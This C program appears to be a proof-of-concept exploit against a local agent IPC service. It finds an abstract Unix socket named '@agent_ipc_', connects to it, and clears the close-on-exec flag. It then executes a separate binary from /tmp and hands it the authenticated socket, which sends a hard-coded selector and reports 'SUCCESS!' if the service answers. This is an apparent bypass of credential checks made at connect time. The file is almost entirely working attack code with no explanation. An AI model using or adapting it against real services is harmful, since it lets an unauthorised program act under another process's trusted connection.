#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stddef.h>

static const unsigned char DEFAULT_SELECTOR[8] = {
    0xa2, 0xd6, 0xed, 0x9c, 0xfc, 0x61, 0xe5, 0x8c
};

static int find_agent_ipc(char *out, size_t out_len) {
    FILE *fp = fopen("/proc/net/unix", "r");
    if (!fp) {
        perror("fopen /proc/net/unix");
        return -1;
    }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        char *name = strstr(line, "@agent_ipc_");
        if (!name) continue;
        name[strcspn(name, " \t\r\n")] = '\0';
        if (strlen(name) + 1 > out_len) {
            fclose(fp);
            return -1;
        }
        strcpy(out, name);
        fclose(fp);
        return 0;
    }
    fclose(fp);
    return -1;
}

int do_child(int fd) {
    printf("[Child] PID=%d resolved_exe=", getpid());
    char exe_path[256] = {0};
    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1) > 0) {
        printf("%s\n", exe_path);
    } else {
        printf("unknown\n");
    }
    
    // Attempt to send on the inherited fd
    uint64_t len = 8;
    if (send(fd, &len, sizeof(len), 0) != sizeof(len)) {
        perror("[Child] send length failed");
        return 1;
    }
    if (send(fd, DEFAULT_SELECTOR, sizeof(DEFAULT_SELECTOR), 0) != sizeof(DEFAULT_SELECTOR)) {
        perror("[Child] send selector failed");
        return 1;
    }
    
    printf("[Child] Message sent. Receiving response...\n");
    unsigned char hdr[8];
    ssize_t got = recv(fd, hdr, sizeof(hdr), 0);
    if (got < 0) {
        perror("[Child] recv header failed");
        return 1;
    }
    printf("[Child] recv header got %zd bytes\n", got);
    if (got == 8) {
        uint64_t body_len;
        memcpy(&body_len, hdr, 8);
        printf("[Child] response body len = %lu\n", (unsigned long)body_len);
        
        unsigned char body[1024];
        if (body_len <= sizeof(body)) {
            got = recv(fd, body, body_len, 0);
            if (got > 0) {
                printf("[Child] SUCCESS! Got body data of length %zd\n", got);
            }
        }
    }
    return 0;
}

int main(int argc, char **argv) {
    if (argc > 2 && strcmp(argv[1], "--child") == 0) {
        return do_child(atoi(argv[2]));
    }
    
    char name[128];
    if (find_agent_ipc(name, sizeof(name)) != 0) {
        fprintf(stderr, "find_agent_ipc failed\n");
        return 1;
    }
    
    int fd = socket(AF_UNIX, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }
    
    int one = 1;
    if (setsockopt(fd, SOL_SOCKET, SO_PASSCRED, &one, sizeof(one)) != 0) {
        perror("setsockopt SO_PASSCRED");
        close(fd);
        return 1;
    }
    
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    addr.sun_path[0] = '\0';
    memcpy(addr.sun_path + 1, name + 1, strlen(name)-1);
    socklen_t addr_len = offsetof(struct sockaddr_un, sun_path) + strlen(name);
    
    if (connect(fd, (struct sockaddr *)&addr, addr_len) != 0) {
        perror("connect");
        close(fd);
        return 1;
    }
    
    printf("[Parent] Connected successfully! fd=%d\n", fd);
    
    // Clear close-on-exec to ensure child can inherit it.
    int flags = fcntl(fd, F_GETFD);
    if (flags >= 0) {
        fcntl(fd, F_SETFD, flags & ~FD_CLOEXEC);
    }
    
    // Now execve a completely different binary (e.g. /tmp/delegation_child)
    char fd_str[16];
    sprintf(fd_str, "%d", fd);
    char *child_args[] = {"/tmp/delegation_child", "--child", fd_str, NULL};
    char *child_env[] = {NULL};
    
    printf("[Parent] Executing child helper...\n");
    execve("/tmp/delegation_child", child_args, child_env);
    perror("execve");
    close(fd);
    return 1;
}
